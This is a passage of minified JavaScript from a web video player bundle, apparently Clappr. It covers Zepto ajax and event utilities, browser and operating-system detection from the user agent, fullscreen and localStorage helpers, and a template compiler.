Date,Ae=window.document,me=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,ye=/^(?:text|application)\/javascript/i,Ee=/^(?:text|application)\/xml/i,be="application/json",ke=/^\s*$/,(_e=Ae.createElement("a")).href=window.location.href,A.active=0,A.ajaxJSONP=function(r,n){var e,i,a,s,o,t,l,u;return"type"in r?(e=r.jsonpCallback,i=(A.isFunction(e)?e():e)||"Zepto"+ge++,a=Ae.createElement("script"),s=window[i],l={abort:t=function(e){A(a).triggerHandler("error",e||"abort")}},n&&n.promise(l),A(a).on("load error",(function(e,t){clearTimeout(u),A(a).off().remove(),"error"!=e.type&&o?lt(o[0],l,r,n):ut(null,t||"error",l,r,n),window[i]=s,o&&A.isFunction(s)&&s(o[0]),s=o=void 0})),!1===ot(l,r)?t("abort"):(window[i]=function(){o=arguments},a.src=r.url.replace(/\?(.+)=\?/,"?$1="+i),Ae.head.appendChild(a),0<r.timeout&&(u=setTimeout((function(){t("timeout")}),r.timeout))),l):A.ajax(r)},A.ajaxSettings={type:"GET",beforeSend:R,success:R,error:R,complete:R,context:null,global:!0,xhr:function(){return new window.XMLHttpRequest},accepts:{script:"text/javascript, application/javascript, application/x-javascript",json:be,xml:"application/xml, text/xml",html:"text/html",text:"text/plain"},crossDomain:!1,timeout:0,processData:!0,cache:!0,dataFilter:R},A.ajax=function(e){var o=A.extend({},e||{}),l=A.Deferred&&A.Deferred();for(ve in A.ajaxSettings)void 0===o[ve]&&(o[ve]=A.ajaxSettings[ve]);(t=o).global&&0==A.active++&&C(t,null,"ajaxStart"),o.crossDomain||((t=Ae.createElement("a")).href=o.url,t.href=t.href,o.crossDomain=_e.protocol+"//"+_e.host!=t.protocol+"//"+t.host),o.url||(o.url=window.location.toString()),-1<(t=o.url.indexOf("#"))&&(o.url=o.url.slice(0,t)),(t=o).processData&&t.data&&"string"!=A.type(t.data)&&(t.data=A.param(t.data,t.traditional)),!t.data||t.type&&"GET"!=t.type.toUpperCase()&&"jsonp"!=t.dataType||(t.url=dt(t.url,t.data),t.data=void 0);var u=o.dataType,t=/\?.+=\?/.test(o.url);if(t&&(u="jsonp"),!1!==o.cache&&(e&&!0===e.cache||"script"!=u&&"jsonp"!=u)||(o.url=dt(o.url,"_="+Date.now())),"jsonp"==u)return t||(o.url=dt(o.url,o.jsonp?o.jsonp+"=?":!1===o.jsonp?"":"callback=?")),A.ajaxJSONP(o,l);function r(e,t){n[e.toLowerCase()]=[e,t]}e=o.accepts[u];var c,n={},d=/^([\w-]+:)\/\//.test(o.url)?RegExp.$1:window.location.protocol,f=o.xhr(),i=f.setRequestHeader;if(l&&l.promise(f),o.crossDomain||r("X-Requested-With","XMLHttpRequest"),r("Accept",e||"*/*"),(e=o.mimeType||e)&&(-1<e.indexOf(",")&&(e=e.split(",",2)[0]),f.overrideMimeType)&&f.overrideMimeType(e),(o.contentType||!1!==o.contentType&&o.data&&"GET"!=o.type.toUpperCase())&&r("Content-Type",o.contentType||"application/x-www-form-urlencoded"),o.headers)for(m in o.headers)r(m,o.headers[m]);if(f.setRequestHeader=r,!(f.onreadystatechange=function(){if(4==f.readyState){f.onreadystatechange=R,clearTimeout(c);var e,t=!1;if(200<=f.status&&f.status<300||304==f.status||0==f.status&&"file:"==d){if(u=u||(s=(s=o.mimeType||f.getResponseHeader("content-type"))&&s.split(";",2)[0])&&("text/html"==s?"html":s==be?"json":ye.test(s)?"script":Ee.test(s)&&"xml")||"text","arraybuffer"==f.responseType||"blob"==f.responseType)e=f.response;else{e=f.responseText;try{r=e,n=u,e=(i=o).dataFilter==R?r:(a=i.context,i.dataFilter.call(a,r,n)),"script"==u?(0,eval)(e):"xml"==u?e=f.responseXML:"json"==u&&(e=ke.test(e)?null:A.parseJSON(e))}catch(e){t=e}if(t)return ut(t,"parsererror",f,o,l)}lt(e,f,o,l)}else ut(f.statusText||null,f.status?"error":"abort",f,o,l)}var r,n,i,a,s})===ot(f,o))f.abort(),ut(null,"abort",f,o,l);else{if(t=!("async"in o)||o.async,f.open(o.type,o.url,t,o.username,o.password),o.xhrFields)for(m in o.xhrFields)f[m]=o.xhrFields[m];for(m in n)i.apply(f,n[m]);0<o.timeout&&(c=setTimeout((function(){f.onreadystatechange=R,f.abort(),ut(null,"timeout",f,o,l)}),o.timeout)),f.send(o.data||null)}return f},A.get=function(){return A.ajax(ft.apply(null,arguments))},A.post=function(){var e=ft.apply(null,arguments);return e.type="POST",A.ajax(e)},A.getJSON=function(){var e=ft.apply(null,arguments);return e.dataType="json",A.ajax(e)},A.fn.load=function(e,t,r){var n,i,a,s;return this.length&&(n=this,i=e.split(/\s/),e=ft(e,t,r),s=e.success,1<i.length&&(e.url=i[0],a=i[1]),e.success=function(e){n.html(a?A("<div>").html(e.replace(me,"")).find(a):e),s&&s.apply(n,arguments)},A.ajax(e)),this},Te=encodeURIComponent,A.param=function(e,t){var r=[];return r.add=function(e,t){null==(t=A.isFunction(t)?t():t)&&(t=""),this.push(Te(e)+"="+Te(t))},function r(n,e,i,a){var s,o=A.isArray(e),l=A.isPlainObject(e);A.each(e,(function(e,t){s=A.type(t),a&&(e=i?a:a+"["+(l||"object"==s||"array"==s?e:"")+"]"),!a&&o?n.add(t.name,t.value):"array"==s||!i&&"object"==s?r(n,t,i,e):n.add(e,t)}))}(r,e,t),r.join("&").replace(/%20/g,"+")},(Se=t).Callbacks=function(n){function i(e){for(t=n.memory&&e,r=!0,l=s||0,s=0,o=u.length,a=!0;u&&l<o;++l)if(!1===u[l].apply(e[0],e[1])&&n.stopOnFalse){t=!1;break}a=!1,u&&(c?c.length&&i(c.shift()):t?u.length=0:d.disable())}n=Se.extend({},n);var t,r,a,s,o,l,u=[],c=!n.once&&[],d={add:function(){var e,r;return u&&(e=u.length,(r=function(e){Se.each(e,(function(e,t){"function"==typeof t?n.unique&&d.has(t)||u.push(t):t&&t.length&&"string"!=typeof t&&r(t)}))})(arguments),a?o=u.length:t&&(s=e,i(t))),this},remove:function(){return u&&Se.each(arguments,(function(e,t){for(var r;-1<(r=Se.inArray(t,u,r));)u.splice(r,1),a&&(r<=o&&--o,r<=l)&&--l})),this},has:function(e){return!(!u||!(e?-1<Se.inArray(e,u):u.length))},empty:function(){return o=u.length=0,this},disable:function(){return u=c=t=void 0,this},disabled:function(){return!u},lock:function(){return c=void 0,t||d.disable(),this},locked:function(){return!c},fireWith:function(e,t){return!u||r&&!c||(t=[e,(t=t||[]).slice?t.slice():t],a?c.push(t):i(t)),this},fire:function(){return d.fireWith(this,arguments)},fired:function(){return!!r}};return d},y=t,Ce=Array.prototype.slice,y.when=function(e){function t(t,r,n){return function(e){r[t]=this,n[t]=1<arguments.length?Ce.call(arguments):e,n===i?u.notifyWith(r,n):--l||u.resolveWith(r,n)}}var i,r,n,a=Ce.call(arguments),s=a.length,o=0,l=1!==s||e&&y.isFunction(e.promise)?s:0,u=1===l?e:ht();if(1<s)for(i=new Array(s),r=new Array(s),n=new Array(s);o<s;++o)a[o]&&y.isFunction(a[o].promise)?a[o].promise().done(t(o,n,a)).fail(u.reject).progress(t(o,r,i)):--l;return l||u.resolveWith(n,a),u.promise()},y.Deferred=ht,E=t,Re=1,we=Array.prototype.slice,Oe=E.isFunction,Le={},Ie={},De="onfocusin"in window,Pe={focus:"focusin",blur:"focusout"},Ne={mouseenter:"mouseover",mouseleave:"mouseout"},Ie.click=Ie.mousedown=Ie.mouseup=Ie.mousemove="MouseEvents",E.event={add:yt,remove:Et},E.proxy=function(e,t){var r,n=2 in arguments&&we.call(arguments,2);if(Oe(e))return(r=function(){return e.apply(t,n?n.concat(we.call(arguments)):arguments)})._zid=pt(e),r;if(w(t))return n?(n.unshift(e[t],e),E.proxy.apply(null,n)):E.proxy(e[t],e);throw new TypeError("expected function")},E.fn.bind=function(e,t,r){return this.on(e,t,r)},E.fn.unbind=function(e,t){return this.off(e,t)},E.fn.one=function(e,t,r,n){return this.on(e,t,r,n,1)},xe=function(){return!0},Me=function(){return!1},Fe=/^([A-Z]|returnValue$|layer[XY]$|webkitMovement[XY]$)/,Be={preventDefault:"isDefaultPrevented",stopImmediatePropagation:"isImmediatePropagationStopped",stopPropagation:"isPropagationStopped"},E.fn.delegate=function(e,t,r){return this.on(t,e,r)},E.fn.undelegate=function(e,t,r){return this.off(t,e,r)},E.fn.live=function(e,t){return E(document.body).delegate(this.selector,e,t),this},E.fn.die=function(e,t){return E(document.body).undelegate(this.selector,e,t),this},E.fn.on=function(t,n,i,a,s){var o,l,r=this;return t&&!w(t)?(E.each(t,(function(e,t){r.on(e,n,i,t,s)})),r):(w(n)||Oe(a)||!1===a||(a=i,i=n,n=b),a!==b&&!1!==i||(a=i,i=b),!1===a&&(a=Me),r.each((function(e,r){s&&(o=function(e){return Et(r,e.type,a),a.apply(this,arguments)}),yt(r,t,a,i,n,(l=n?function(e){var t=E(e.target).closest(n,r).get(0);if(t&&t!==r)return e=E.extend(kt(e),{currentTarget:t,liveFired:r}),(o||a).apply(t,[e].concat(we.call(arguments,1)))}:l)||o)})))},E.fn.off=function(e,r,t){var n=this;return e&&!w(e)?(E.each(e,(function(e,t){n.off(e,r,t)})),n):(w(r)||Oe(t)||!1===t||(t=r,r=b),!1===t&&(t=Me),n.each((function(){Et(this,e,t,r)})))},E.fn.trigger=function(e,t){return(e=w(e)||E.isPlainObject(e)?E.Event(e):bt(e))._args=t,this.each((function(){e.type in Pe&&"function"==typeof this[e.type]?this[e.type]():"dispatchEvent"in this?this.dispatchEvent(e):E(this).triggerHandler(e,t)}))},E.fn.triggerHandler=function(r,n){var i,a;return this.each((function(e,t){(i=kt(w(r)?E.Event(r):r))._args=n,i.target=t,E.each(vt(t,r.type||r),(function(e,t){if(a=t.proxy(i),i.isImmediatePropagationStopped())return!1}))})),a},"focusin focusout focus blur load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select keydown keypress keyup error".split(" ").forEach((function(t){E.fn[t]=function(e){return 0 in arguments?this.bind(t,e):this.trigger(t)}})),E.Event=function(e,t){w(e)||(e=(t=e).type);var r=document.createEvent(Ie[e]||"Events"),n=!0;if(t)for(var i in t)"bubbles"==i?n=!!t[i]:r[i]=t[i];return r.initEvent(e,n,!0),bt(r)};try{getComputedStyle(void 0)}catch(e){var _t=getComputedStyle;window.getComputedStyle=function(e,t){try{return _t(e,t)}catch(e){return null}}}function Tt(e){return((e=Ue(e)).width()||e.height())&&"none"!==e.css("display")}function St(e,t){e=e.replace(/=#\]/g,'="#"]');var r,n,i=Ke.exec(e);return i&&i[2]in Ge&&(n=Ge[i[2]],r=i[3],e=i[1],r)&&(i=Number(r),r=isNaN(i)?r.replace(/^["']|["']$/g,""):i),t(e,n,r)}function Ct(e,t){var r=e.split(".",2);t.fullVersion=e,r[0]&&(t.majorVersion=parseInt(r[0])),r[1]&&(t.minorVersion=parseInt(r[1]))}function Rt(e,t,r){var n="["==t.substr(0,1)?new RegExp(t,"g"):t;n=e.split(n,2);"."!=t&&(e=e.replace(new RegExp(t,"g"),".")),r.fullVersion=e,n&&n[0]&&(r.majorVersion=parseInt(n[0])),n&&n[1]&&(r.minorVersion=parseInt(n[1]))}k=(Ue=t).zepto,je=k.qsa,Ve=k.matches,Ge=Ue.expr[":"]={visible:function(){if(Tt(this))return this},hidden:function(){if(!Tt(this))return this},selected:function(){if(this.selected)return this},checked:function(){if(this.checked)return this},parent:function(){return this.parentNode},first:function(e){if(0===e)return this},last:function(e,t){if(e===t.length-1)return this},eq:function(e,t,r){if(e===r)return this},contains:function(e,t,r){if(-1<Ue(this).text().indexOf(r))return this},has:function(e,t,r){if(k.qsa(this,r).length)return this}},Ke=new RegExp("(.*):(\\w+)(?:\\(([^)]+)\\))?$\\s*"),Ye=/^\s*>/,He="Zepto"+ +new Date,k.qsa=function(a,s){return St(s,(function(e,r,n){try{!e&&r?e="*":Ye.test(e)&&(t=Ue(a).addClass(He),e="."+He+" "+e);var t,i=je(a,e)}catch(e){throw console.error("error performing selector: %o",s),e}finally{t&&t.removeClass(He)}return r?k.uniq(Ue.map(i,(function(e,t){return r.call(e,t,i,n)}))):i}))},k.matches=function(n,e){return St(e,(function(e,t,r){return(!e||Ve(n,e))&&(!t||t.call(n,null,r)===n)}))};var O=t,wt=[{name:"Chromium",group:"Chrome",identifier:"Chromium/([0-9.]*)"},{name:"Chrome Mobile",group:"Chrome",identifier:"Chrome/([0-9.]*) Mobile",versionIdentifier:"Chrome/([0-9.]*)"},{name:"Chrome",group:"Chrome",identifier:"Chrome/([0-9.]*)"},{name:"Chrome for iOS",group:"Chrome",identifier:"CriOS/([0-9.]*)"},{name:"Android Browser",group:"Chrome",identifier:"CrMo/([0-9.]*)"},{name:"Firefox",group:"Firefox",identifier:"Firefox/([0-9.]*)"},{name:"Opera Mini",group:"Opera",identifier:"Opera Mini/([0-9.]*)"},{name:"Opera",group:"Opera",identifier:"Opera ([0-9.]*)"},{name:"Opera",group:"Opera",identifier:"Opera/([0-9.]*)",versionIdentifier:"Version/([0-9.]*)"},{name:"IEMobile",group:"Explorer",identifier:"IEMobile/([0-9.]*)"},{name:"Internet Explorer",group:"Explorer",identifier:"MSIE ([a-zA-Z0-9.]*)"},{name:"Internet Explorer",group:"Explorer",identifier:"Trident/([0-9.]*)",versionIdentifier:"rv:([0-9.]*)"},{name:"Spartan",group:"Spartan",identifier:"Edge/([0-9.]*)",versionIdentifier:"Edge/([0-9.]*)"},{name:"Safari",group:"Safari",identifier:"Safari/([0-9.]*)",versionIdentifier:"Version/([0-9.]*)"}],Ot=[{name:"Windows 2000",group:"Windows",identifier:"Windows NT 5.0",version:"5.0"},{name:"Windows XP",group:"Windows",identifier:"Windows NT 5.1",version:"5.1"},{name:"Windows Vista",group:"Windows",identifier:"Windows NT 6.0",version:"6.0"},{name:"Windows 7",group:"Windows",identifier:"Windows NT 6.1",version:"7.0"},{name:"Windows 8",group:"Windows",identifier:"Windows NT 6.2",version:"8.0"},{name:"Windows 8.1",group:"Windows",identifier:"Windows NT 6.3",version:"8.1"},{name:"Windows 10",group:"Windows",identifier:"Windows NT 10.0",version:"10.0"},{name:"Windows Phone",group:"Windows Phone",identifier:"Windows Phone ([0-9.]*)"},{name:"Windows Phone",group:"Windows Phone",identifier:"Windows Phone OS ([0-9.]*)"},{name:"Windows",group:"Windows",identifier:"Windows"},{name:"Chrome OS",group:"Chrome OS",identifier:"CrOS"},{name:"Android",group:"Android",identifier:"Android",versionIdentifier:"Android ([a-zA-Z0-9.-]*)"},{name:"iPad",group:"iOS",identifier:"iPad",versionIdentifier:"OS ([0-9_]*)",versionSeparator:"[_|.]"},{name:"iPod",group:"iOS",identifier:"iPod",versionIdentifier:"OS ([0-9_]*)",versionSeparator:"[_|.]"},{name:"iPhone",group:"iOS",identifier:"iPhone OS",versionIdentifier:"OS ([0-9_]*)",versionSeparator:"[_|.]"},{name:"Mac OS X High Sierra",group:"Mac OS",identifier:"Mac OS X (10([_|.])13([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Sierra",group:"Mac OS",identifier:"Mac OS X (10([_|.])12([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X El Capitan",group:"Mac OS",identifier:"Mac OS X (10([_|.])11([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Yosemite",group:"Mac OS",identifier:"Mac OS X (10([_|.])10([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Mavericks",group:"Mac OS",identifier:"Mac OS X (10([_|.])9([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Mountain Lion",group:"Mac OS",identifier:"Mac OS X (10([_|.])8([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Lion",group:"Mac OS",identifier:"Mac OS X (10([_|.])7([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Snow Leopard",group:"Mac OS",identifier:"Mac OS X (10([_|.])6([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Leopard",group:"Mac OS",identifier:"Mac OS X (10([_|.])5([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Tiger",group:"Mac OS",identifier:"Mac OS X (10([_|.])4([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Panther",group:"Mac OS",identifier:"Mac OS X (10([_|.])3([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Jaguar",group:"Mac OS",identifier:"Mac OS X (10([_|.])2([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Puma",group:"Mac OS",identifier:"Mac OS X (10([_|.])1([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS X Cheetah",group:"Mac OS",identifier:"Mac OS X (10([_|.])0([0-9_.]*))",versionSeparator:"[_|.]"},{name:"Mac OS",group:"Mac OS",identifier:"Mac OS"},{name:"Ubuntu",group:"Linux",identifier:"Ubuntu",versionIdentifier:"Ubuntu/([0-9.]*)"},{name:"Debian",group:"Linux",identifier:"Debian"},{name:"Gentoo",group:"Linux",identifier:"Gentoo"},{name:"Linux",group:"Linux",identifier:"Linux"},{name:"BlackBerry",group:"BlackBerry",identifier:"BlackBerry"}],L={};e=function(e){var t,r=e.match(/\b(playstation 4|nx|opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)||[];if(/trident/i.test(r[1]))return t=/\brv[ :]+(\d+)/g.exec(e)||[],{name:"IE",version:parseInt(t[1]||"")};if("Chrome"===r[1]){if(null!=(t=e.match(/\bOPR\/(\d+)/)))return{name:"Opera",version:parseInt(t[1])};if(null!=(t=e.match(/\bEdge\/(\d+)/)))return{name:"Edge",version:parseInt(t[1])}}else/android/i.test(e)&&(t=e.match(/version\/(\d+)/i))&&(r.splice(1,1,"Android WebView"),r.splice(2,1,t[1]));return{name:(r=r[2]?[r[1],r[2]]:[navigator.appName,navigator.appVersion,"-?"])[0],version:parseInt(r[1])}}(navigator.userAgent);if(L.isEdge=/edge/i.test(navigator.userAgent),L.isChrome=/chrome|CriOS/i.test(navigator.userAgent)&&!L.isEdge,L.isSafari=/safari/i.test(navigator.userAgent)&&!L.isChrome&&!L.isEdge,L.isFirefox=/firefox/i.test(navigator.userAgent),L.isLegacyIE=!!window.ActiveXObject,L.isIE=L.isLegacyIE||/trident.*rv:1\d/i.test(navigator.userAgent),L.isIE11=/trident.*rv:11/i.test(navigator.userAgent),L.isChromecast=L.isChrome&&/CrKey/i.test(navigator.userAgent),L.isMobile=/Android|webOS|iPhone|iPad|iPod|BlackBerry|Windows Phone|IEMobile|Mobile Safari|Opera Mini/i.test(navigator.userAgent),L.isiOS=/iPad|iPhone|iPod/i.test(navigator.userAgent),L.isAndroid=/Android/i.test(navigator.userAgent),L.isWindowsPhone=/Windows Phone/i.test(navigator.userAgent),L.isWin8App=/MSAppHost/i.test(navigator.userAgent),L.isWiiU=/WiiU/i.test(navigator.userAgent),L.isPS4=/PlayStation 4/i.test(navigator.userAgent),L.hasLocalstorage=function(){try{return localStorage.setItem("clappr","clappr"),localStorage.removeItem("clappr"),!0}catch(e){return!1}}(),L.hasFlash=function(){try{return!!new ActiveXObject("ShockwaveFlash.ShockwaveFlash")}catch(e){return!(!navigator.mimeTypes||void 0===navigator.mimeTypes["application/x-shockwave-flash"]||!navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin)}}(),L.name=e.name,L.version=e.version,L.userAgent=navigator.userAgent,L.data=function(){var e,t={},r=L.userAgent.toLowerCase(),n=W(wt);try{for(n.s();!(e=n.n()).done;){var i,a=e.value,s=new RegExp(a.identifier.toLowerCase()).exec(r);if(null!=s&&s[1]){t.name=a.name,t.group=a.group,a.versionIdentifier?null!=(i=new RegExp(a.versionIdentifier.toLowerCase()).exec(r))&&i[1]&&Ct(i[1],t):Ct(s[1],t);break}}}catch(e){n.e(e)}finally{n.f()}return t}(),L.os=function(){var e,t={},r=L.userAgent.toLowerCase(),n=W(Ot);try{for(n.s();!(e=n.n()).done;){var i,a=e.value,s=new RegExp(a.identifier.toLowerCase()).exec(r);if(null!=s){t.name=a.name,t.group=a.group,a.version?Rt(a.version,a.versionSeparator||".",t):s[1]?Rt(s[1],a.versionSeparator||".",t):a.versionIdentifier&&null!=(i=new RegExp(a.versionIdentifier.toLowerCase()).exec(r))&&i[1]&&Rt(i[1],a.versionSeparator||".",t);break}}}catch(e){n.e(e)}finally{n.f()}return t}(),L.viewport=((t={}).width=O(window).width(),t.height=O(window).height(),t),L.device=function(e){return(e=/\((iP(?:hone|ad|od))?(?:[^;]*; ){0,2}([^)]+(?=\)))/.exec(e))&&(e[1]||e[2])||""}(L.userAgent),void 0!==window.orientation)switch(window.orientation){case-90:case 90:L.viewport.orientation="landscape";break;default:L.viewport.orientation="portrait"}var Lt={},It=[],Dt=(window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||function(e){window.setTimeout(e,1e3/60)}).bind(window),Pt=(window.cancelAnimationFrame||window.mozCancelAnimationFrame||window.webkitCancelAnimationFrame||window.clearTimeout).bind(window);function Nt(e,t){if(t)for(var r in t){var n=Object.getOwnPropertyDescriptor(t,r);n?Object.defineProperty(e,r,n):e[r]=t[r]}return e}function xt(e,s){var t=function(){c(a,e);var i=d(a);function a(){var e;u(this,a);for(var t=arguments.length,r=new Array(t),n=0;n<t;n++)r[n]=arguments[n];return e=i.call.apply(i,[this].concat(r)),s.initialize&&s.initialize.apply(G(e),r),e}return a}();return Nt(t.prototype,s),t}var Mt={fullscreenElement:function(){return document.fullscreenElement||document.webkitFullscreenElement||document.mozFullScreenElement||document.msFullscreenElement},requestFullscreen:function(e){if(e.requestFullscreen)return e.requestFullscreen();if(e.webkitRequestFullscreen){if("function"==typeof e.then)return e.webkitRequestFullscreen();e.webkitRequestFullscreen()}else{if(e.mozRequestFullScreen)return e.mozRequestFullScreen();if(e.msRequestFullscreen)return e.msRequestFullscreen();e.querySelector&&e.querySelector("video")&&e.querySelector("video").webkitEnterFullScreen?e.querySelector("video").webkitEnterFullScreen():e.webkitEnterFullScreen&&e.webkitEnterFullScreen()}},cancelFullscreen:function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:document;e.exitFullscreen?e.exitFullscreen():e.webkitCancelFullScreen?e.webkitCancelFullScreen():e.webkitExitFullscreen?e.webkitExitFullscreen():e.mozCancelFullScreen?e.mozCancelFullScreen():e.msExitFullscreen&&e.msExitFullscreen()},fullscreenEnabled:function(){return!!(document.fullscreenEnabled||document.webkitFullscreenEnabled||document.mozFullScreenEnabled||document.msFullscreenEnabled)}},Ft=(e=function(){function e(){u(this,e)}return s(e,null,[{key:"_defaultConfig",value:function(){return{volume:{value:100,parse:parseInt}}}},{key:"_defaultValueFor",value:function(e){try{return this._defaultConfig()[e].parse(this._defaultConfig()[e].value)}catch(e){}}},{key:"_createKeyspace",value:function(e){return"clappr.".concat(document.domain,".").concat(e)}},{key:"restore",value:function(e){return L.hasLocalstorage&&localStorage[this._createKeyspace(e)]?this._defaultConfig()[e].parse(localStorage[this._createKeyspace(e)]):this._defaultValueFor(e)}},{key:"persist",value:function(e,t){if(L.hasLocalstorage)try{return localStorage[this._createKeyspace(e)]=t,!0}catch(e){return!1}}}]),e}(),function(){function e(){u(this,e)}return s(e,null,[{key:"parse",value:function(e){for(var t,r=/\+/g,n=/([^&=]+)=?([^&]*)/g,i=function(e){return decodeURIComponent(e.replace(r," "))},a={};t=n.exec(e);)a[i(t[1]).toLowerCase()]=i(t[2]);return a}},{key:"params",get:function(){var e=window.location.search.substring(1);return e!==this.query&&(this._urlParams=this.parse(e),this.query=e),this._urlParams}},{key:"hashParams",get:function(){var e=window.location.hash.substring(1);return e!==this.hash&&(this._hashParams=this.parse(e),this.hash=e),this._hashParams}}]),e}());function Bt(){var r,e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:"t",n=0,t=(e=Ft.params[e]||Ft.hashParams[e]||"").match(/[0-9]+[hms]+/g)||[];return 0<t.length?(r={h:3600,m:60,s:1},t.forEach((function(e){var t;e&&(t=e[e.length-1],e=parseInt(e.slice(0,e.length-1),10),n+=e*r[t])}))):e&&(n=parseInt(e,10)),n}function Ut(e){return Lt[e]||(Lt[e]=0),e+ ++Lt[e]}function jt(e){return 0<=e-parseFloat(e)+1}function Vt(){var e=document.getElementsByTagName("script");return e.length?e[e.length-1].src:""}function Gt(){return window.navigator&&window.navigator.language}function Kt(r,e){var t=((t=(e=Object.assign({inline:!1,muted:!1,timeout:250,type:"video",source:ze.mp4,element:null},e)).element||document.createElement(e.type)).muted=e.muted,!0===e.muted&&t.setAttribute("muted","muted"),!0===e.inline&&t.setAttribute("playsinline","playsinline"),t.src=e.source,t.play()),n=setTimeout((function(){i(!1,new Error("Timeout ".concat(e.timeout," ms has been reached")))}),e.timeout),i=function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:null;clearTimeout(n),r(e,t)};void 0!==t?t.then((function(){return i(!0)})).catch((function(e){return i(!1,e)})):i(!0)}function Yt(e,t,r,n){if(r){if("object"===F(r)){for(var i in r)e[t].apply(e,[i,r[i]].concat(n));return}if(rr.test(r)){for(var a=r.split(rr),s=0,o=a.length;s<o;s++)e[t].apply(e,[a[s]].concat(n));return}}return 1}function Ht(e,r,n,i){var a,s=-1,o=e.length,l=r[0],u=r[1],c=r[2];!function t(){try{switch(r.length){case 0:for(;++s<o;)(a=e[s]).callback.call(a.ctx);return;case 1:for(;++s<o;)(a=e[s]).callback.call(a.ctx,l);return;case 2:for(;++s<o;)(a=e[s]).callback.call(a.ctx,l,u);return;case 3:for(;++s<o;)(a=e[s]).callback.call(a.ctx,l,u,c);return;default:for(;++s<o;)(a=e[s]).callback.apply(a.ctx,r);return}}catch(e){D.error.apply(D,[n,"error on event",i,"trigger","-",e]),t()}}()}function zt(e){return null===e?"":(""+e).replace(ur,(function(e){return lr[e]}))}function $t(a,e){var t,r=new RegExp([(ir.escape||ar).source,(ir.interpolate||ar).source,(ir.evaluate||ar).source].join("|")+"|$","g"),s=0,o="__p+='";a.replace(r,(function(e,t,r,n,i){return o+=a.slice(s,i).replace(or,(function(e){return"\\"+sr[e]})),t&&(o+="'+\n((__t=("+t+"))==null?'':escapeExpr(__t))+\n'"),r&&(o+="'+\n((__t=("+r+"))==null?'':__t)+\n'"),n&&(o+="';\n"+n+"\n__p+='"),s=i+e.length,e})),o+="';\n",o="var __t,__p='',__j=Array.prototype.join,print=function(){__p+=__j.call(arguments,'');};\n"+(o=ir.variable?o:"with(obj||{}){\n"+o+"}\n")+"return __p;\n//# sourceURL=/microtemplates/source["+cr+++"]";try{t=new Function(ir.variable||"obj","escapeExpr",o)}catch(e){throw e.source=o,e}return e?t(e,zt):((r=function(e){return t.call(this,e,zt)}).source="function("+(ir.variable||"obj")+"){\n"+o+"}",r)}function Wt(e,t){return e&&t?Object.entries(e).filter((function(e){return Y(e,2)[1].type===t})).reduce((function(e,t){var r=(t=Y(t,2))[0];t=t[1];return e[r]=t,e}),{}):{}}var I,qt=function(){function e(){u(this,e)}return s(e,null,[{key:"configure",value:function(e){this.options=O.extend(!0,this.options,e)}},{key:"create",value:function(e){return this.options.recycleVideo&&"video"===e&&0<It.length?It.shift():document.createElement(e)}},{key:"garbage",value:function(t){this.options.recycleVideo&&"VIDEO"===t.tagName.toUpperCase()&&(O(t).children().remove(),Object.values(t.attributes).forEach((function(e){return t.removeAttribute(e.name)})),It.push(t))}}]),e}(),Xt=(qt.options={recycleVideo:!1},function(){function t(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:500;u(this,t),this.delay=e,this.lastTime=0}return s(t,[{key:"handle",value:function(e,t){var r=!(2<arguments.length&&void 0!==arguments[2])||arguments[2],n=(new Date).getTime(),i=n-this.lastTime;i<this.delay&&0<i&&(t(),r)&&e.preventDefault(),this.lastTime=n}}]),t}()),Zt={Config:e,Fullscreen:Mt,QueryString:Ft,DomRecycler:qt,assign:Nt,extend:xt,formatTime:function(e,t){if(!isFinite(e))return"--:--";e*=1e3;var r=(e=parseInt(e/1e3))%60,n=(e=parseInt(e/60))%60,i=(e=parseInt(e/60))%24,a="";return(e=parseInt(e/24))&&0<e&&(a+=e+":",i<1)&&(a+="00:"),(i&&0<i||t)&&(a+=("0"+i).slice(-2)+":"),(a=(a+=("0"+n).slice(-2)+":")+("0"+r).slice(-2)).trim()},seekStringToSeconds:Bt,uniqueId:Ut,currentScriptUrl:Vt,isNumber:jt,requestAnimationFrame:Dt,cancelAnimationFrame:Pt,getBrowserLanguage:Gt,now:function(){return(window.performance&&window.performance.now?performance:Date).now()},removeArrayItem:function(e,t){0<=(t=e.indexOf(t))&&e.splice(t,1)},listContainsIgnoreCase:function(t,e){return void 0!==t&&void 0!==e&&void 0!==e.find((function(e){return t.toLowerCase()===e.toLowerCase()}))},canAutoPlayMedia:Kt,Media:ze,DoubleEventHandler:Xt},Qt="color: #ff8000;"+(t="font-weight: bold; font-size: 13px;"),Jt=["color: #0000ff;font-weight: bold; font-size: 13px;","color: #006600;font-weight: bold; font-size: 13px;",Qt,e="color: #ff0000;"+t,e],er=["debug","info","warn","error","disabled"],D=function(){function r(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1,t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:3;u(this,r),this.EXCLUDE_LIST=["timeupdate","playback:timeupdate","playback:progress","container:hover","container:timeupdate","container:progress"],this.level=e,this.previousLevel=this.level,this.offLevel=t}return s(r,[{key:"level",get:function(){return 